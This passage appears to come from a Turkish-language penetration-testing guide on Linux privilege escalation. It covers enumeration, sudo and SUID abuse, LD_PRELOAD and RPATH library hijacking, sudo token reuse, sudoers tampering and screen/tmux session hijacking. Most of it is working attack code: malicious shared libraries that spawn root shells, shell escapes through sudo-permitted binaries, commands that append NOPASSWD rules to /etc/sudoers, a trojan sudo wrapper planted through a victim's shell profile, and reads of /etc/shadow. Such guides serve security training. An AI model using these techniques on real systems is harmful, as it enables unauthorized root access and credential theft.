Eğer **`runc`** komutunu kullanabildiğinizi görürseniz, aşağıdaki sayfayı okuyun çünkü **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus, uygulamaların verimli bir şekilde etkileşimde bulunup veri paylaşmalarını sağlayan gelişmiş bir **inter-Process Communication (IPC) system**'dir. Modern Linux sistemi düşünülerek tasarlanmış olan D-Bus, farklı uygulama iletişim biçimleri için sağlam bir çerçeve sunar.

Sistem çok yönlüdür; süreçler arasında veri alışverişini geliştiren temel IPC'yi destekler, bu da **enhanced UNIX domain sockets**'a benzeyen bir yapıdır. Ayrıca olayların veya sinyallerin yayınlanmasını kolaylaştırır; bu da sistem bileşenleri arasında sorunsuz entegrasyonu teşvik eder. Örneğin, bir Bluetooth daemon'undan gelen gelen çağrı bilgisi bir müzik oynatıcıyı sessize aldırabilir. D-Bus ayrıca uzak nesne sistemini destekleyerek, uygulamalar arasında servis istekleri ve metod çağrılarını basitleştirir; geleneksel olarak karmaşık olan süreçleri düzene sokar.

D-Bus, mesaj izinlerini (metod çağrıları, sinyal yayınları vb.) eşleşen politika kurallarının kümülatif etkisine göre yöneten bir **allow/deny model** üzerinde çalışır. Bu politikalar bus ile etkileşimleri belirtir ve bu izinlerin kötüye kullanılması yoluyla ayrıcalık yükseltmeye olanak sağlayabilir.

Bir örnek politika /etc/dbus-1/system.d/wpa_supplicant.conf içinde verilmiştir; bu, root kullanıcısının fi.w1.wpa_supplicant1 ile sahip olma, mesaj gönderme ve alma izinlerini detaylandırır.

Belirli bir kullanıcı veya grup belirtilmemiş politikalar evrensel olarak uygulanırken, "default" context politikaları diğer spesifik politikalarla kapsanmayan herkese uygulanır.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**D-Bus communication'ı nasıl enumerate ve exploit edeceğinizi burada öğrenin:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Ağ**

Ağı enumerate etmek ve makinenin konumunu tespit etmek her zaman ilginçtir.

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Açık portlar

Erişim sağlamadan önce, daha önce etkileşim kuramadığınız makinede çalışan ağ servislerini her zaman kontrol edin:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Ağ trafiğini sniff edip edemeyeceğinizi kontrol edin. Eğer yapabiliyorsanız, bazı credentials elde edebilirsiniz.
```
timeout 1 tcpdump
```
## Kullanıcılar

### Generic Enumeration

Kendinizin **kim** olduğunu, hangi **ayrıcalıklara** sahip olduğunuzu, sistemde hangi **kullanıcıların** bulunduğunu, hangilerinin **giriş** yapabildiğini ve hangilerinin **root ayrıcalıklarına** sahip olduğunu kontrol edin:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Bazı Linux sürümleri, **UID > INT_MAX** olan kullanıcıların ayrıcalıkları yükseltmesine izin veren bir hatadan etkilendi. Daha fazla bilgi: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) ve [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Gruplar

Kök ayrıcalıkları verebilecek **herhangi bir grubun üyesi** olup olmadığınızı kontrol edin:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Pano

Panoda ilginç bir şey olup olmadığını kontrol edin (mümkünse)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Parola Politikası
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Bilinen parolalar

Eğer **herhangi bir parolayı biliyorsanız** ortamdaki, **her kullanıcı için o parola ile giriş yapmayı deneyin**.

### Su Brute

Eğer çok gürültü (noise) çıkarmaktan çekinmiyorsanız ve bilgisayarda `su` ve `timeout` ikili dosyaları mevcutsa, [su-bruteforce](https://github.com/carlospolop/su-bruteforce) kullanarak kullanıcıları brute-force etmeyi deneyebilirsiniz.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) `-a` parametresiyle kullanıcıları brute-force etmeyi de dener.

## Yazılabilir PATH suistimalleri

### $PATH

Eğer **$PATH içindeki bir klasöre yazabiliyorsanız** ayrıcalıkları **yazılabilir klasörün içine bir backdoor oluşturarak** yükseltebilirsiniz; bu backdoor, farklı bir kullanıcı (tercihen root) tarafından çalıştırılacak bir komutun adıyla olmalı ve **$PATH'te yazılabilir klasörünüzden önce bulunan bir klasörden yüklenmemelidir**.

### SUDO and SUID

sudo kullanarak bazı komutları çalıştırma izniniz olabilir ya da bazı ikili dosyalar suid bitine sahip olabilir. Bunu şu şekilde kontrol edin:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Bazı **beklenmedik komutlar dosyaları okumaya ve/veya yazmaya veya hatta bir komut çalıştırmaya izin verir.** Örneğin:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo yapılandırması, bir kullanıcının parola bilmeden başka bir kullanıcının ayrıcalıklarıyla bazı komutları çalıştırmasına izin verebilir.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Bu örnekte `demo` kullanıcısı `root` olarak `vim` çalıştırabiliyor; artık root dizinine bir ssh anahtarı ekleyerek veya `sh` çağırarak bir shell elde etmek çok kolay.
```
sudo vim -c '!sh'
```
### SETENV

Bu yönerge, kullanıcının bir şeyi çalıştırırken **set an environment variable** belirlemesine olanak tanır:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Bu örnek, **based on HTB machine Admirer**, bir betiği root olarak çalıştırırken rastgele bir python kütüphanesini yüklemek için **PYTHONPATH hijacking**'e **vulnerable** idi:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV preserved via sudo env_keep → root shell

Eğer sudoers `BASH_ENV`'i koruyorsa (ör. `Defaults env_keep+="ENV BASH_ENV"`), izin verilen bir komutu çalıştırırken Bash’in etkileşimsiz başlangıç davranışını kullanarak root olarak rastgele kod çalıştırabilirsiniz.

- Neden işe yarar: Etkileşimsiz shell'ler için, Bash `$BASH_ENV`'i değerlendirir ve hedef script çalıştırılmadan önce o dosyayı source eder. Birçok sudo kuralı bir script veya bir shell wrapper çalıştırmaya izin verir. Eğer sudo `BASH_ENV`'i koruyorsa, dosyanız root ayrıcalıklarıyla source edilir.

- Gereksinimler:
- Çalıştırabileceğiniz bir sudo kuralı (etkileşimsiz olarak `/bin/bash`'i çağıran herhangi bir hedef veya herhangi bir bash scripti).
- `BASH_ENV`'in `env_keep` içinde olması (kontrol etmek için `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Sertleştirme:
- Kaldırın `BASH_ENV` (ve `ENV`) öğelerini `env_keep`'ten; `env_reset` kullanmayı tercih edin.
- sudo ile izin verilen komutlar için shell wrapper'larından kaçının; mümkün olduğunca minimal binary'ler kullanın.
- Korunan env değişkenleri kullanıldığında sudo için I/O günlükleme ve uyarı mekanizmalarını değerlendirin.

### Sudo yürütme atlatma yolları

**Jump** ile diğer dosyaları okumak veya **symlinks** kullanmak. Örneğin sudoers dosyasında: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Eğer bir **wildcard** kullanılırsa (\*), bu daha da kolaydır:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Karşı Önlemler**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo komutu/SUID binary komut yolu belirtilmeden

Eğer **sudo permission** tek bir komuta **yol belirtilmeden** verilmişse: _hacker10 ALL= (root) less_ PATH değişkenini değiştirerek bunu suistimal edebilirsiniz.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Bu teknik, bir **suid** binary'nin **komutun yolunu belirtmeden başka bir komut çalıştırması durumunda da kullanılabilir (her zaman garip bir SUID binary'nin içeriğini _**strings**_ ile kontrol edin)**.

[Payload examples to execute.](payloads-to-execute.md)

### Komut yolu belirtilmiş SUID binary

Eğer **suid** binary **yolu belirtilmiş başka bir komutu çalıştırıyorsa**, suid dosyasının çağırdığı komutla aynı ada sahip bir fonksiyon oluşturup bunu **export a function** olarak dışa aktarmayı deneyebilirsiniz.

Örneğin, eğer bir suid binary _**/usr/sbin/service apache2 start**_ çağırıyorsa, aynı isimde bir fonksiyon oluşturup bunu dışa aktarmayı denemelisiniz:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Sonra, suid binary'yi çağırdığınızda bu fonksiyon çalıştırılacak

### LD_PRELOAD & **LD_LIBRARY_PATH**

The **LD_PRELOAD** environment variable is used to specify one or more shared libraries (.so files) to be loaded by the loader before all others, including the standard C library (`libc.so`). This process is known as preloading a library.

However, to maintain system security and prevent this feature from being exploited, particularly with **suid/sgid** executables, the system enforces certain conditions:

- Loader, gerçek kullanıcı kimliği (_ruid_) ile etkin kullanıcı kimliği (_euid_) eşleşmeyen executables için **LD_PRELOAD**'u dikkate almaz.
- **suid/sgid** olan executables'lar için yalnızca standart yollarda bulunan ve ayrıca suid/sgid olan kütüphaneler preload edilir.

Privilege escalation can occur if you have the ability to execute commands with `sudo` and the output of `sudo -l` includes the statement **env_keep+=LD_PRELOAD**. This configuration allows the **LD_PRELOAD** environment variable to persist and be recognized even when commands are run with `sudo`, potentially leading to the execution of arbitrary code with elevated privileges.
```
Defaults        env_keep += LD_PRELOAD
```
Şu isimle kaydedin: **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Sonra **derleyin** kullanarak:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Son olarak, **escalate privileges** çalıştırarak
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Benzer bir privesc, saldırgan **LD_LIBRARY_PATH** env variable'ını kontrol ediyorsa kötüye kullanılabilir çünkü kütüphanelerin aranacağı yolu o kontrol eder.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Olağandışı görünen **SUID** izinlerine sahip bir binary ile karşılaşıldığında, **.so** dosyalarını düzgün şekilde yükleyip yüklemediğini doğrulamak iyi bir uygulamadır. Bu, aşağıdaki komutu çalıştırarak kontrol edilebilir:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Örneğin, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ gibi bir hatayla karşılaşmak sömürü potansiyeline işaret eder.

Bunu istismar etmek için, aşağıdaki kodu içeren örneğin _"/path/to/.config/libcalc.c"_ adında bir C dosyası oluşturulur:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Bu kod, derlenip çalıştırıldığında, dosya izinlerini manipüle ederek ve yükseltilmiş ayrıcalıklarla bir shell çalıştırarak ayrıcalıkları yükseltmeyi amaçlar.

Yukarıdaki C dosyasını bir shared object (.so) dosyasına şu komutla derleyin:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Son olarak, etkilenmiş SUID binary'yi çalıştırmak istismarı tetiklemeli ve potansiyel olarak sistemin ele geçirilmesine izin vermelidir.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Yazabileceğimiz bir klasörden kütüphane yükleyen bir SUID binary bulduğumuza göre, gerekli isimle kütüphaneyi o klasöre oluşturalım:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Aşağıdaki gibi bir hata alırsanız
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
bu, oluşturduğunuz kütüphanenin `a_function_name` adında bir fonksiyona sahip olması gerektiği anlamına gelir.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) Unix binaries içeren, bir saldırganın yerel güvenlik kısıtlamalarını atlatmak için suistimal edebileceği öğelerin küratörlüğünü yapan bir listedir. [**GTFOArgs**](https://gtfoargs.github.io/) komutta **only inject arguments** yapabildiğiniz durumlar için aynısıdır.

Proje, break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells ve diğer post-exploitation görevlerini kolaylaştırmak için suistimal edilebilecek Unix binaries'lerinin meşru fonksiyonlarını toplar.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Eğer `sudo -l` erişiminiz varsa, herhangi bir sudo kuralını nasıl suistimal edebileceğini bulup bulmadığını kontrol etmek için [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) aracını kullanabilirsiniz.

### Reusing Sudo Tokens

Parolasını bilmediğiniz ancak **sudo access**'iniz olduğu durumlarda, ayrıcalıkları yükseltmek için **waiting for a sudo command execution and then hijacking the session token** yöntemini kullanabilirsiniz.

Requirements to escalate privileges:

- Zaten _sampleuser_ kullanıcısı olarak bir shell'e sahipsiniz
- _sampleuser_ son 15 dakika içinde `sudo` kullanmış olmalıdır (varsayılan olarak bu, şifre girmeden `sudo` kullanmamıza izin veren sudo tokeninin süresidir)
- `cat /proc/sys/kernel/yama/ptrace_scope` değeri 0 olmalı
- `gdb` erişilebilir olmalı (yükleyebilmelisiniz)

(Geçici olarak `ptrace_scope`'u `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ile etkinleştirebilir veya kalıcı olarak `/etc/sysctl.d/10-ptrace.conf` dosyasını değiştirip `kernel.yama.ptrace_scope = 0` ayarlayabilirsiniz)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **İkinci exploit** (`exploit_v2.sh`) _/tmp_ içinde bir sh shell oluşturacak **root'a ait ve setuid ile**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **üçüncü exploit** (`exploit_v3.sh`) **bir sudoers file oluşturacak**; bu **sudo tokens'i sonsuz kılar ve tüm kullanıcıların sudo kullanmasına izin verir**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Eğer klasörde veya klasör içindeki oluşturulan dosyalardan herhangi birinde **write permissions**'a sahipseniz ikili [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) programını kullanarak **create a sudo token for a user and PID** oluşturabilirsiniz.\
Örneğin, _/var/run/sudo/ts/sampleuser_ dosyasını overwrite edebiliyorsanız ve o kullanıcı olarak PID 1234 ile bir shell'e sahipseniz, şifreyi bilmenize gerek kalmadan şu şekilde **obtain sudo privileges** elde edebilirsiniz:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Dosya `/etc/sudoers` ve `/etc/sudoers.d` içindeki dosyalar kimin `sudo` kullanabileceğini ve nasıl kullanacağını yapılandırır. Bu dosyalar **varsayılan olarak yalnızca user root ve group root tarafından okunabilir**.\
**Eğer** bu dosyayı **okuyabiliyorsanız** bazı ilginç bilgileri **elde edebilirsiniz**, ve eğer herhangi bir dosyayı **yazabiliyorsanız** **escalate privileges** yapabilirsiniz.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Yazabiliyorsanız, bu izni kötüye kullanabilirsiniz.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Bu izinleri kötüye kullanmanın bir başka yolu:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

`sudo` binary'sine alternatif olarak OpenBSD için `doas` gibi araçlar vardır; yapılandırmasını `/etc/doas.conf` içinde kontrol etmeyi unutmayın.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Eğer bir **kullanıcının genellikle bir makineye bağlandığını ve ayrıcalıkları yükseltmek için `sudo` kullandığını** biliyorsanız ve o kullanıcı bağlamında bir shell elde ettiyseniz, root olarak kodunuzu ve ardından kullanıcının komutunu çalıştıracak **yeni bir sudo executable oluşturabilirsiniz**. Sonra, kullanıcı bağlamının **$PATH**'ini (örneğin yeni yolu `.bash_profile` içine ekleyerek) **değiştirin**, böylece kullanıcı `sudo`'yu çalıştırdığında sizin sudo executable'ınız çalıştırılır.

Dikkat: eğer kullanıcı farklı bir shell (bash olmayan) kullanıyorsa yeni yolu eklemek için diğer dosyaları değiştirmeniz gerekecektir. Örneğin [sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` dosyalarını değiştirir. Başka bir örneği [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) içinde bulabilirsiniz.

Veya şöyle bir şey çalıştırmak:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Paylaşılan Kütüphane

### ld.so

Dosya `/etc/ld.so.conf` **yüklenen yapılandırma dosyalarının nereden geldiğini** gösterir. Genellikle bu dosya şu yolu içerir: `include /etc/ld.so.conf.d/*.conf`

Bu, `/etc/ld.so.conf.d/*.conf` içindeki yapılandırma dosyalarının okunacağı anlamına gelir. Bu yapılandırma dosyaları **başka klasörleri işaret eder**; **kütüphaneler** bu klasörlerde **aranacaktır**. Örneğin, `/etc/ld.so.conf.d/libc.conf` içeriği `/usr/local/lib`'tür. **Bu, sistemin `/usr/local/lib` içinde kütüphaneleri arayacağı anlamına gelir**.

Eğer herhangi bir nedenle belirtilen yollardan herhangi birinde **bir kullanıcının yazma izinleri** varsa: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` içindeki herhangi bir dosya veya `/etc/ld.so.conf.d/*.conf` içindeki yapılandırma dosyasında belirtilen herhangi bir klasör, o kullanıcı escalate privileges yapabilir.\
Aşağıdaki sayfada **how to exploit this misconfiguration** konusuna bakın:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib'i `/var/tmp/flag15/` dizinine kopyaladığınızda, `RPATH` değişkeninde belirtildiği gibi program tarafından bu konumda kullanılacaktır.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Ardından `/var/tmp` içinde şu komutla kötü amaçlı bir kütüphane oluşturun: `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Yetkiler

Linux yetkileri bir sürece verilebilen root ayrıcalıklarının **bir alt kümesini** sağlar. Bu, root ayrıcalıklarını **daha küçük ve ayırt edici birimlere** böler. Bu birimlerin her biri daha sonra süreçlere bağımsız olarak verilebilir. Böylece tüm ayrıcalık seti azaltılır, istismar riskleri düşer.\
Yetkiler ve bunların nasıl kötüye kullanılabileceği hakkında **daha fazla bilgi edinmek için** aşağıdaki sayfayı okuyun:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Dizin izinleri

Bir dizinde, **"execute" biti** ilgili kullanıcının "**cd**" ile klasöre girebileceğini ifade eder.\
**"read"** biti kullanıcının **dosyaları** **listeleyebilmesini** sağlar; **"write"** biti ise kullanıcının **dosyaları** **silmesine** ve **yeni dosyalar oluşturmasına** izin verir.

## ACLs

Erişim Kontrol Listeleri (ACLs), isteğe bağlı izinlerin ikincil katmanını temsil eder ve geleneksel ugo/rwx izinlerini **geçersiz kılabilir**. Bu izinler, sahip olmayan veya grubun bir üyesi olmayan belirli kullanıcılara haklar verip reddederek dosya veya dizin erişimi üzerinde daha fazla kontrol sağlar. Bu düzeydeki **ince ayrıntılar daha hassas erişim yönetimi sağlar**. Daha fazla detay [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux) adresinde bulunabilir.

**Verin** kullanıcı "kali"'ye bir dosya üzerinde okuma ve yazma izinleri:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Al** sistemden belirli ACLs ile olan dosyaları:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Açık shell oturumları

**eski sürümlerde** farklı bir kullanıcının (**root**) bazı **shell** oturumlarını **hijack** edebilirsiniz.\
**en yeni sürümlerde** yalnızca **your own user**'a ait screen sessions'e **connect** olabilirsiniz. Ancak, **oturumun içinde ilginç bilgiler** bulabilirsiniz.

### screen sessions hijacking

**screen sessions'i listele**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Oturuma bağlan**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Bu, eski tmux sürümleriyle ilgili bir sorundu. Yetkisiz bir kullanıcı olarak root tarafından oluşturulan tmux (v2.1) oturumunu ele geçiremedim.

**tmux oturumlarını listele**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Oturuma bağlan**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Örnek için **Valentine box from HTB**'a bakın.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Eylül 2006 ile 13 Mayıs 2008 arasında Debian tabanlı sistemlerde (Ubuntu, Kubuntu, vb.) oluşturulan tüm SSL ve SSH anahtarları bu hatadan etkilenmiş olabilir.\
Bu hata, bu işletim sistemlerinde yeni bir ssh anahtarı oluşturulurken ortaya çıkar; çünkü **sadece 32,768 varyasyon mümkündü**. Bu, tüm olasılıkların hesaplanabileceği ve **ssh public key'e sahip olduğunuzda karşılık gelen private key'i arayabileceğiniz** anlamına gelir. Hesaplanmış olasılıkları şurada bulabilirsiniz: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Parola doğrulamasına izin verilip verilmediğini belirtir. Varsayılan `no`.
- **PubkeyAuthentication:** Public key doğrulamasına izin verilip verilmediğini belirtir. Varsayılan `yes`.
- **PermitEmptyPasswords**: Parola doğrulaması izinliyse, sunucunun boş parola dizelerine sahip hesaplara girişe izin verip vermediğini belirtir. Varsayılan `no`.

### PermitRootLogin

root'un ssh kullanarak giriş yapıp yapamayacağını belirtir, varsayılan `no`. Olası değerler:

- `yes`: root parola ve private key ile giriş yapabilir
- `without-password` or `prohibit-password`: root sadece private key ile giriş yapabilir
- `forced-commands-only`: Root sadece private key kullanarak ve komut seçenekleri belirtilmişse giriş yapabilir
- `no` : hayır

### AuthorizedKeysFile

Kullanıcı doğrulaması için kullanılabilecek public key'leri içeren dosyaları belirtir. `%h` gibi tokenlar içerebilir; bu tokenlar home dizini ile değiştirilecektir. **Mutlak yollar** ( `/` ile başlayan) veya **kullanıcının home dizininden göreli yollar** belirtebilirsiniz. Örneğin:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Bu yapılandırma, kullanıcı "**testusername**"ın **private** anahtarıyla giriş yapmaya çalışırsanız, ssh'nin anahtarınızın public anahtarını `/home/testusername/.ssh/authorized_keys` ve `/home/testusername/access`'te bulunanlarla karşılaştıracağını belirtir.

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding, **yerel SSH anahtarlarınızı sunucunuzda bırakmak yerine kullanmanıza** olanak tanır (parolasız!). Böylece ssh ile **bir hosta** atlayıp oradan **ilk hostunuzda bulunan anahtarı kullanarak** **başka bir hosta** bağlanabilirsiniz.

Bu seçeneği `$HOME/.ssh.config` içinde şu şekilde ayarlamanız gerekir:
```
Host example.com
ForwardAgent yes
```
Dikkat: eğer `Host` `*` ise kullanıcı her farklı makineye geçtiğinde o host anahtarlara erişebilecek (bu bir güvenlik sorunudur).

Dosya `/etc/ssh_config` bu **options**'ı **override** edebilir ve bu yapılandırmaya izin verebilir veya engelleyebilir.\
Dosya `/etc/sshd_config` `AllowAgentForwarding` anahtarı ile `ssh-agent` forwarding'e izin verebilir veya engelleyebilir (varsayılan olarak izinlidir).

Eğer bir ortamda Forward Agent yapılandırıldığını görürseniz aşağıdaki sayfayı okuyun; çünkü **bunu kötüye kullanarak ayrıcalıkları yükseltebilirsiniz**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## İlginç Dosyalar

### Profil dosyaları

